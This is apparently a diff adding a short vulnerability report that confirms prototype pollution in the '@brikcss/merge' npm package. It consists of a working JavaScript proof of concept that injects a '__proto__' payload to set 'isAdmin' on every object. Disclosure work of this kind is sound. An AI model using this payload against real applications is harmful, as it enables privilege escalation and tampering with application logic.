@@ -1,0 +1,20 @@
+Confirmed prototype pollution in `@brikcss/merge`.
+
+```javascript
+const merge = require("@brikcss/merge");
+
+// Attacker-controlled JSON (e.g. from user input, config file, or API request)
+const maliciousInput = JSON.parse('{"__proto__":{"polluted":"yes","isAdmin":true}}');
+
+// Application merges attacker data into an object it trusts
+merge({}, maliciousInput);
+
+// Object.prototype is now polluted for every object in the process
+const victim = {};
+console.log("polluted:", victim.polluted);   // "yes"
+console.log("isAdmin:", victim.isAdmin);     // true
+
+if (victim.isAdmin) {
+  console.log("Prototype pollution succeeded: arbitrary object now has isAdmin=true");
+}
+```
